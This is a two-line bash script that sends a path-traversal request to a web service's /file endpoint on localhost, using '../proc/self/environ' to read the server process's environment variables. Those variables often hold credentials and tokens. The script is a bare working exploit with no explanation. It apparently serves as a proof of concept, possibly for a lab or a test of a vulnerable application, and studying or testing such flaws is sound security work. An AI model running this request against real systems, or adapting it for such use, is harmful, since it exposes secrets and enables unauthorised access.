#!/bin/bash
curl -o - 'http://localhost:3000/file?path=../proc/self/environ'
